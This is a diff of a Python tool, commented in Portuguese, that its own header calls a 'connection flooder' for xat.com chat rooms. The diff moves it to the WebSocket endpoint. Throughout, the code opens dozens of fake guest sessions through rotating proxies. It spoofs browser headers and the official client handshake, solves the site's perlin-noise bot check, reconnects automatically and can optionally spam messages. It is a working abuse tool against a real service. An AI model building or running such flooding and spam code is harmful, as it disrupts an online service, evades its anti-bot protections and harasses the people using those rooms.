@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # language: Python 3.10+ | target: Ubuntu Linux VPS | runtime: asyncio
-# xat.com lotador de sala (connection flooder) via protocolo XMLSocket (guest).
-# Nao executa nada alem de abrir sockets TCP; rode na VPS, nao na maquina local.
+# xat.com lotador de sala — protocolo WebSocket wss://wss.xat.com/v2 (guest).
+# Handshake XML identico ao cliente HTML5: <y u="2"> -> <j2 k="" u="2"> -> <done>.
+# Nao executa nada alem de abrir WebSockets; rode na VPS.
 
 from __future__ import annotations
 
@@ -19,7 +20,6 @@ from typing import Optional
 
 import aiohttp
 from aiohttp_socks import ProxyConnector
-from python_socks.async_.asyncio import Proxy
 from rich import box
 from rich.console import Console, Group
 from rich.live import Live
@@ -30,23 +30,16 @@ from rich.text import Text
 # --------------------------------------------------------------------------- #
 # constantes
 # --------------------------------------------------------------------------- #
-IP2_URL = "https://xat.com/web_gear/chat/ip2.php"
+WS_URL = "wss://wss.xat.com/v2"
 ROOMID_URLS = [
     "https://xat.com/web_gear/chat/roomid.php?d={name}",
     "https://xat.com/api/roomid.php?d={name}",
 ]
-
-LEGACY_HOST = "s.xat.com"  # endpoint TCP cru historico, fala XMLSocket direto
-
-AUSER3_URL = "https://xat.com/web_gear/chat/auser3.php"  # gera UserId + k1 por IP
-
 PERLIN_URLS = {
     "100_100_5_100": "https://raw.githubusercontent.com/TwiN/PythonXatBot/master/100_100_5_100.txt",
     "100_100_5_101": "https://raw.githubusercontent.com/TwiN/PythonXatBot/master/100_100_5_101.txt",
 }
-
-# k1 de convidado legado (2016). Hoje o par UserId+k1 vem do auser3.php.
-GUEST_K1 = "5cfeb32e41588e383d00"
+Z_VERSION = "m1.68.2,3"  # versao do cliente, vai no <j2 z="...">
 
 UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
@@ -56,13 +49,13 @@ BROWSER_HEADERS = {
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
     "Accept-Encoding": "gzip, deflate",
+    "Origin": "https://xat.com",
     "Referer": "https://xat.com/",
-    "Upgrade-Insecure-Requests": "1",
 }
 
 LOGOUT_CODES = {
     "E03": "j2/y invalido - room ou userno ausente",
-    "E07": "k1 ausente/incorreta - atualize --k1",
+    "E07": "k1 ausente/incorreta",
     "E12": "modo 'nao logar automaticamente'",
     "E25": "l5/k3 incorreto - falha no perlin noise",
     "E36": "protect ativado (sala protegida por senha)",
@@ -98,7 +91,7 @@ def _escape(s: str) -> str:
 
 
 def parse_packet(raw: bytes) -> tuple[str, dict]:
-    """Transforma um pacote XMLSocket em (tag, dict_de_atributos)."""
+    """Transforma um payload XMLSocket em (tag, dict_de_atributos)."""
     text = raw.decode("utf-8", "replace")
     text = re.sub(r'("[^"]*")([^\s/>])', r"\1 \2", text)  # <y a="1"b="2"/> fix
     m = _TAG_RE.search(text)
@@ -109,12 +102,12 @@ def parse_packet(raw: bytes) -> tuple[str, dict]:
     return tag, attrs
 
 
-def build_packet(tag: str, attrs: dict, order: Optional[list] = None) -> bytes:
+def build_xml(tag: str, attrs: dict, order: Optional[list] = None) -> str:
     keys = order or list(attrs.keys())
     parts = [f'<{tag}'] + [
         f'{k}="{_escape(str(attrs[k]))}"' for k in keys if k in attrs
     ] + ["/>"]
-    return (" ".join(parts) + "\x00").encode("utf-8")
+    return " ".join(parts)
 
 
 # --------------------------------------------------------------------------- #
@@ -122,18 +115,16 @@ def build_packet(tag: str, attrs: dict, order: Optional[list] = None) -> bytes:
 # --------------------------------------------------------------------------- #
 @dataclass
 class Config:
-    room: str                      # nome ou id numerico
+    room: str
     roomid: int = 0
     count: int = 50
-    proxy: list = field(default_factory=list)   # urls completas scheme://user:pass@host:port
+    proxy: list = field(default_factory=list)  # scheme://user:pass@host:port
     proxy_type: str = "socks5"
-    k1: Optional[str] = None      # override manual; None = usa auser3.php
-    userid: Optional[str] = None  # userno do override manual (par do --k1)
     names: list = field(default_factory=list)
-    avatar: int = -1               # -1 = aleatorio por conexao
+    avatar: int = -1                 # -1 = aleatorio por conexao
     keepalive: float = 120.0
     connect_delay: float = 0.15
-    handshake_timeout: float = 15.0
+    handshake_timeout: float = 20.0
     socket_timeout: float = 60.0
     reconnect_backoff: float = 2.0
     spam: Optional[str] = None
@@ -141,7 +132,6 @@ class Config:
     perlin_dir: Path = Path.home() / ".cache" / "xat_flood"
     verbose: bool = False
     no_proxy: bool = False
-    legacy: bool = False          # forca s.xat.com em vez dos pools do ip2.php
 
 
 def normalize_proxy(raw: str, ptype: str) -> str:
@@ -151,7 +141,7 @@ def normalize_proxy(raw: str, ptype: str) -> str:
 
 
 # --------------------------------------------------------------------------- #
-# resolvers (HTTP via proxy)
+# resolvers (HTTP via proxy, com fallback direto)
 # --------------------------------------------------------------------------- #
 class Web:
     def __init__(self, proxy_urls: list, no_proxy: bool):
@@ -194,21 +184,6 @@ class Web:
                 last = e
         raise last if last else RuntimeError("sem sessao http")
 
-    async def _fetch_proxy_only(self, url: str) -> str:
-        if self._proxied is None:
-            raise ConnError("proxy indisponivel")
-        return await self._get(self._proxied, url)
-
-    async def get_new_user(self) -> tuple[str, str, str]:
-        text = await self._fetch_proxy_only(AUSER3_URL)
-        m = re.search(r"UserId=(\d+)&k1=([0-9a-fA-F]+)&k2=(\d+)", text)
-        if not m:
-            raise ConnError(f"auser3: resposta inesperada ({text[:60]!r})")
-        uid, k1, k2 = m.group(1), m.group(2), m.group(3)
-        if int(uid) >= 1800000000 or k2 == "0":
-            raise ConnError("auser3 recusou (rate limit) - aguarde e tente de novo")
-        return uid, k1, k2
-
     async def get_json(self, url: str) -> dict:
         return json.loads(await self._fetch_text(url))
 
@@ -231,52 +206,6 @@ async def resolve_roomid(web: Web, room: str) -> int:
         except Exception as e:
             last = e
     raise SystemExit(f"[erro] sala '{room}' nao encontrada (ultimo erro: {last})")
-
-
-# --------------------------------------------------------------------------- #
-# ip2.php -> escolha de servidor (mesma logica do cliente oficial)
-# --------------------------------------------------------------------------- #
-def _get_dom(roomid: int, xflag: int) -> int:
-    if xflag & 8:
-        return random.randint(0, 3)
-    if roomid == 8:
-        return 0
-    if roomid < 8:
-        return 3
-    return (roomid & 96) >> 5
-
-
-def _get_port(roomid: int, xflag: int) -> int:
-    if xflag & 8:
-        return 10007 + random.randint(0, 31)
-    if roomid == 8:
-        return 10000
-    if roomid < 8:
-        return 9999 + roomid
-    return 10007 + (roomid % 32)
-
-
-def pick_server(rules: dict, roomid: int, attempt: int,
-                legacy: bool = False) -> tuple[str, int]:
-    if legacy:
-        return LEGACY_HOST, _get_port(roomid, 0)
-    order = rules["order"]
-    xflag = int(rules.get("xFlag", 0))
-    pool_name, _weight = order[attempt % len(order)]
-    pool = rules[pool_name]                     # [flag, [hosts...]]
-    if pool[0] & 1:
-        idx = random.randint(1, max(1, len(pool) - 1))
-        host_ent = random.choice(pool[idx])
-        parts = host_ent.split(":")
-        host = parts[0]
-        port = int(parts[1]) if len(parts) > 1 and parts[1] else 10000
-        flag = int(parts[2]) if len(parts) > 2 and parts[2] else 39
-        port += random.randint(0, flag - 1)
-    else:
-        dom = _get_dom(roomid, xflag)
-        port = _get_port(roomid, xflag)
-        host = pool[1][(4 * dom) + random.randint(0, 3)]
-    return host, port
 
 
 # --------------------------------------------------------------------------- #
@@ -347,18 +276,12 @@ class ConnError(Exception):
 
 
 class Conn:
-    def __init__(self, idx: int, cfg: Config, rules: dict,
-                 web: Web, perlin: Perlin, proxies: ProxyPool):
+    def __init__(self, idx: int, cfg: Config, perlin: Perlin, proxies: ProxyPool):
         self.idx = idx
         self.cfg = cfg
-        self.rules = rules
-        self.web = web
         self.perlin = perlin
         self.proxies = proxies
 
-        self.userno: Optional[str] = None   # vem do auser3.php
-        self.k1: Optional[str] = None
-        self.k2: Optional[str] = None
         self.name = self._pick_name()
         self.avatar = random.randint(0, 1758) if cfg.avatar < 0 else cfg.avatar
 
@@ -370,10 +293,10 @@ class Conn:
         self.reconnects = 0
         self.last_error = ""
         self.attempt = 0
+        self.userno = "2"  # id atribuido pelo servidor (mostrado no dashboard)
 
-        self._reader: Optional[asyncio.StreamReader] = None
-        self._writer: Optional[asyncio.StreamWriter] = None
-        self._buf = b""
+        self._session: Optional[aiohttp.ClientSession] = None
+        self._ws: Optional[aiohttp.ClientWebSocketResponse] = None
 
     def _pick_name(self) -> str:
         if self.cfg.names:
@@ -381,81 +304,71 @@ class Conn:
         base = random.choice(NAME_POOL)
         return f"{base}_{random.randint(1000, 9999)}"
 
-    # -- identidade guest -------------------------------------------------- #
-    async def _ensure_user(self):
-        if self.userno is not None:
-            return
-        if self.cfg.userid and self.cfg.k1:
-            self.userno, self.k1, self.k2 = self.cfg.userid, self.cfg.k1, "0"
-        else:
-            self.userno, self.k1, self.k2 = await self.web.get_new_user()
-
-    def _clear_user(self):
-        self.userno = self.k1 = self.k2 = None
-
-    # -- io ---------------------------------------------------------------- #
-    async def _send(self, tag: str, attrs: dict, order: Optional[list] = None):
-        self._writer.write(build_packet(tag, attrs, order))
-        await self._writer.drain()
-
-    async def _send_raw(self, data: str):
-        self._writer.write(data.encode("utf-8") + b"\x00")
-        await self._writer.drain()
-
-    async def _read_packet(self, timeout: Optional[float] = None) -> tuple[str, dict]:
-        limit = timeout or self.cfg.socket_timeout
-        deadline = time.monotonic() + limit
-        while b"\x00" not in self._buf:
-            remain = deadline - time.monotonic()
-            if remain <= 0:
-                raise asyncio.TimeoutError()
-            chunk = await asyncio.wait_for(self._reader.read(4096), timeout=remain)
-            if not chunk:
-                raise ConnError("socket fechado pelo servidor")
-            self._buf += chunk
-        raw, self._buf = self._buf.split(b"\x00", 1)
-        if not raw.strip():
-            return await self._read_packet(timeout)
-        return parse_packet(raw)
-
-    async def _connect(self, host: str, port: int):
+    # -- transporte -------------------------------------------------------- #
+    async def _connect(self):
         url = self.proxies.acquire()
         self.proxy_label = url or "direto"
         if url and not self.cfg.no_proxy:
-            proxy = Proxy.from_url(url)
-            sock = await proxy.connect(dest_host=host, dest_port=port,
-                                       timeout=self.cfg.handshake_timeout)
-            self._reader, self._writer = await asyncio.open_connection(sock=sock)
+            connector = ProxyConnector.from_url(url, force_close=True)
+            session = aiohttp.ClientSession(connector=connector)
         else:
-            self._reader, self._writer = await asyncio.open_connection(host, port)
+            session = aiohttp.ClientSession()
+        self._session = session
+        self._ws = await session.ws_connect(
+            WS_URL, headers=BROWSER_HEADERS, heartbeat=30,
+            timeout=self.cfg.handshake_timeout)
+
+    async def _send(self, xml: str):
+        await self._ws.send_bytes(xml.encode("utf-8") + b"\x00")
+
+    async def _recv(self) -> tuple[str, dict]:
+        msg = await asyncio.wait_for(self._ws.receive(),
+                                     timeout=self.cfg.socket_timeout)
+        if msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.CLOSED):
+            raise ConnError("websocket fechado")
+        if msg.type == aiohttp.WSMsgType.ERROR:
+            raise ConnError(f"websocket erro: {self._ws.exception()}")
+        raw = msg.data if isinstance(msg.data, bytes) else str(msg.data).encode()
+        raw = raw.rstrip(b"\x00").strip()
+        if not raw:
+            return await self._recv()
+        return parse_packet(raw)
+
+    async def _close(self):
+        if self._ws:
+            try:
+                await self._ws.close()
+            except Exception:
+                pass
+        if self._session:
+            try:
+                await self._session.close()
+            except Exception:
+                pass
+        self._ws = None
+        self._session = None
+        self.joined_at = None
 
     # -- handshake --------------------------------------------------------- #
     async def _handshake(self):
-        await self._ensure_user()
-        host, port = pick_server(self.rules, self.cfg.roomid, self.attempt,
-                                 self.cfg.legacy)
         self.state = "CONECTANDO"
-        await self._connect(host, port)
+        await self._connect()
         self.attempt += 1
 
         t_start = time.monotonic()
         self.state = "HANDSHAKE"
-        await self._send("y", {"r": str(self.cfg.roomid), "v": "0",
-                               "u": str(self.userno)},
-                         order=["r", "v", "u"])
+        await self._send(build_xml(
+            "y", {"r": str(self.cfg.roomid), "v": "0", "u": "2"},
+            order=["r", "v", "u"]))
 
-        # espera o <y> do servidor (i, c, p = perlin, C="1" = captcha)
+        # espera o <y> do servidor (i, p = perlin, C="1" = captcha)
         while True:
-            tag, attrs = await self._read_packet(self.cfg.handshake_timeout)
+            tag, attrs = await self._recv()
             if tag == "y":
                 break
             if tag == "logout":
-                self._clear_user()
                 raise ConnError(f"logout {attrs.get('e','')} "
-                                f"({LOGOUT_CODES.get(attrs.get('e',''), '?' )})")
-            if tag == "v" and attrs.get("e") == "60":
-                self._clear_user()
-                raise ConnError("k1 recusada (<v e=60>) - atualize --k1")
+                                f"({LOGOUT_CODES.get(attrs.get('e',''), '?')})")
 
         if attrs.get("C") == "1":
             raise ConnError("captcha exigido - conexao abandonada")
@@ -464,35 +377,29 @@ class Conn:
         l5 = "0"
         if attrs.get("p"):
             l5 = await self.perlin.l5(attrs["p"], int(yi))
-        jt2 = int((time.monotonic() - t_start) * 1000)
+        elapsed = int((time.monotonic() - t_start) * 1000)
 
         j2_attrs = {
             "cb": "0", "Y": "2", "l5": l5,
-            "l4": str(int((time.monotonic() - t_start) * 1000)),
-            "l3": str(jt2), "l2": "0",
-            "y": yi, "k": self.k1, "k3": "0", "p": "0",
-            "c": str(self.cfg.roomid), "f": "0", "u": str(self.userno),
-            "d0": "0", "n": self.name, "a": str(self.avatar), "h": "", "v": "0",
+            "l4": str(elapsed), "l3": str(elapsed), "l2": "0",
+            "y": yi, "k": "", "k3": "0", "z": Z_VERSION, "p": "0",
+            "c": str(self.cfg.roomid), "f": "0", "u": "2",
+            "n": self.name + "## ", "a": str(self.avatar), "h": "", "v": "0",
         }
-        j2_order = ["cb", "Y", "l5", "l4", "l3", "l2", "y", "k", "k3", "p",
-                    "c", "f", "u", "d0", "n", "a", "h", "v"]
-        await self._send("j2", j2_attrs, order=j2_order)
+        j2_order = ["cb", "Y", "l5", "l4", "l3", "l2", "y", "k", "k3", "z",
+                    "p", "c", "f", "u", "n", "a", "h", "v"]
+        await self._send(build_xml("j2", j2_attrs, j2_order))
 
         # espera <done/> (ou logout/dup)
         while True:
-            tag, attrs = await self._read_packet(self.cfg.handshake_timeout)
+            tag, attrs = await self._recv()
             if tag == "done":
                 return
             if tag == "logout":
-                self._clear_user()
                 raise ConnError(f"logout {attrs.get('e','')} "
-                                f"({LOGOUT_CODES.get(attrs.get('e',''), '?' )})")
+                                f"({LOGOUT_CODES.get(attrs.get('e',''), '?')})")
             if tag == "dup":
-                self._clear_user()
                 raise ConnError("dup - userno duplicado")
-            if tag == "v" and attrs.get("e") == "60":
-                self._clear_user()
-                raise ConnError("k1 recusada (<v e=60>)")
 
     # -- pos-join ---------------------------------------------------------- #
     async def _hold(self):
@@ -503,30 +410,30 @@ class Conn:
         if self.cfg.spam:
             spam = asyncio.create_task(self._spam_loop())
         try:
-            await self._send_raw("<w0 />")  # pool principal
             while True:
                 try:
-                    tag, attrs = await self._read_packet(self.cfg.socket_timeout)
+                    tag, attrs = await self._recv()
                 except asyncio.TimeoutError:
                     continue  # silencio do servidor e normal
                 if tag == "logout":
                     raise ConnError(f"logout {attrs.get('e','')}")
-                if tag == "dup":
-                    raise ConnError("dup - userno duplicado")
                 if tag == "m":
                     self.msgs += 1
+                if tag == "u":
+                    # captura o id real atribuido (quando e o nosso <u>)
+                    if self.name.split("##")[0] in attrs.get("n", ""):
+                        self.userno = attrs.get("u", self.userno)
         finally:
             keep.cancel()
             if spam:
                 spam.cancel()
-            self._close()
+            await self._close()
 
     async def _keepalive_loop(self):
         try:
             while True:
                 await asyncio.sleep(self.cfg.keepalive)
-                await self._send("c", {"u": "1", "t": "/KEEPALIVE"},
-                                 order=["u", "t"])
+                await self._send('<c u="1" t="/KEEPALIVE" />')
                 self.keepalives += 1
         except asyncio.CancelledError:
             pass
@@ -537,24 +444,13 @@ class Conn:
         try:
             while True:
                 await asyncio.sleep(self.cfg.spam_interval)
-                await self._send("m", {"u": str(self.userno),
-                                       "t": self.cfg.spam}, order=["u", "t"])
+                await self._send(build_xml(
+                    "m", {"u": "2", "t": self.cfg.spam}, order=["u", "t"]))
                 self.msgs += 1
         except asyncio.CancelledError:
             pass
         except Exception:
             pass
-
-    def _close(self):
-        if self._writer:
-            try:
-                self._writer.close()
-            except Exception:
-                pass
-        self._reader = None
-        self._writer = None
-        self._buf = b""
-        self.joined_at = None
 
     # -- ciclo de vida ----------------------------------------------------- #
     async def run(self, stop: asyncio.Event):
@@ -570,7 +466,7 @@ class Conn:
                 self.last_error = f"{type(e).__name__}: {str(e)[:50]}"
                 self.state = "RECONECTANDO"
             finally:
-                self._close()
+                await self._close()
             if stop.is_set():
                 break
             self.reconnects += 1
@@ -611,8 +507,8 @@ def render_dashboard(cfg: Config, conns: list, start: float) -> Group:
     table.add_column("#", justify="right", style="dim", width=4)
     table.add_column("status", width=13)
     table.add_column("proxy", width=34)
-    table.add_column("userno", width=11)
-    table.add_column("nome", width=18)
+    table.add_column("id", width=11)
+    table.add_column("nome", width=20)
     table.add_column("ka", justify="right", width=5)
     table.add_column("msg", justify="right", width=5)
     table.add_column("erro", overflow="fold")
@@ -621,13 +517,13 @@ def render_dashboard(cfg: Config, conns: list, start: float) -> Group:
         style = STATUS_STYLE.get(c.state, "white")
         uptime_c = ""
         if c.joined_at:
-            uptime_c = f"{int(time.time() - c.joined_at)}s"
+            uptime_c = f" {int(time.time() - c.joined_at)}s"
         table.add_row(
             str(c.idx),
             f"[{style}]{c.state}[/]",
             c.proxy_label,
-            str(c.userno) if c.userno else "-",
-            c.name + (" " + uptime_c if uptime_c else ""),
+            str(c.userno),
+            c.name + uptime_c,
             str(c.keepalives),
             str(c.msgs),
             c.last_error,
@@ -640,38 +536,35 @@ def render_dashboard(cfg: Config, conns: list, start: float) -> Group:
 # --------------------------------------------------------------------------- #
 def parse_args(argv) -> Config:
     ap = argparse.ArgumentParser(
-        prog="xat_flood", description="Lotador de sala xat.com (conexoes guest)")
+        prog="xat_flood", description="Lotador de sala xat.com (WebSocket guest)")
     ap.add_argument("--room", required=True,
-                    help="nome da sala (ex: Help) ou id numerico")
-    ap.add_argument("--count", type=int, default=50, help="numero de conexoes (default 50)")
+                    help="nome da sala (ex: aff) ou id numerico")
+    ap.add_argument("--count", type=int, default=50,
+                    help="numero de conexoes (default 50)")
     ap.add_argument("--proxy", action="append", default=[],
                     help="proxy user:pass@host:port (repita p/ varios)")
-    ap.add_argument("--proxy-type", default="socks5", choices=["socks5", "socks4", "http"])
-    ap.add_argument("--no-proxy", action="store_true", help="conecta direto (sem proxy)")
-    ap.add_argument("--k1", default=None,
-                    help="k1 manual (override; usar junto com --userid)")
-    ap.add_argument("--userid", default=None,
-                    help="userno manual (override; usar junto com --k1)")
+    ap.add_argument("--proxy-type", default="socks5",
+                    choices=["socks5", "socks4", "http"])
+    ap.add_argument("--no-proxy", action="store_true",
+                    help="conecta direto (sem proxy)")
     ap.add_argument("--names", help="nomes separados por virgula (cicla)")
     ap.add_argument("--avatar", type=int, default=-1, help="avatar fixo (0-1758)")
     ap.add_argument("--keepalive", type=float, default=120.0)
     ap.add_argument("--connect-delay", type=float, default=0.15)
     ap.add_argument("--spam", help="mensagem opcional para spammar no chat")
     ap.add_argument("--spam-interval", type=float, default=15.0)
-    ap.add_argument("--legacy-server", action="store_true",
-                    help="forca s.xat.com (TCP cru) em vez dos pools do ip2.php")
     ap.add_argument("--verbose", action="store_true")
     args = ap.parse_args(argv)
 
     cfg = Config(
         room=args.room, count=args.count,
         proxy=[normalize_proxy(p, args.proxy_type) for p in args.proxy],
-        proxy_type=args.proxy_type, k1=args.k1, userid=args.userid,
+        proxy_type=args.proxy_type,
         names=args.names.split(",") if args.names else [],
         avatar=args.avatar, keepalive=args.keepalive,
         connect_delay=args.connect_delay, spam=args.spam,
         spam_interval=args.spam_interval, verbose=args.verbose,
-        no_proxy=args.no_proxy, legacy=args.legacy_server,
+        no_proxy=args.no_proxy,
     )
     return cfg
 
@@ -681,8 +574,6 @@ async def amain(cfg: Config, console: Console):
     await web.start()
     try:
         cfg.roomid = await resolve_roomid(web, cfg.room)
-        rules = await web.get_json(IP2_URL)
-        console.print(f"[cyan]ip2.php[/] ordem={rules['order']} xFlag={rules.get('xFlag')}")
         console.print(f"[cyan]sala[/] {cfg.room} -> id {cfg.roomid}")
     except Exception as e:
         console.print(f"[red]falha ao resolver[/] {e}")
@@ -691,8 +582,7 @@ async def amain(cfg: Config, console: Console):
 
     perlin = Perlin(cfg.perlin_dir, web)
     proxies = ProxyPool(cfg.proxy)
-    conns = [Conn(i, cfg, rules, web, perlin, proxies)
-             for i in range(1, cfg.count + 1)]
+    conns = [Conn(i, cfg, perlin, proxies) for i in range(1, cfg.count + 1)]
 
     stop = asyncio.Event()
     tasks = []
@@ -731,7 +621,7 @@ async def amain(cfg: Config, console: Console):
     console.print(Panel(
         "[bold green]encerrado.[/] "
         f"conexoes criadas={cfg.count} "
-        f"online_final={sum(1 for c in conns if c.state=='ONLINE')} "
+        f"online_final={sum(1 for c in conns if c.state == 'ONLINE')} "
         f"reconexoes={sum(c.reconnects for c in conns)}",
         box=box.SQUARE))
 
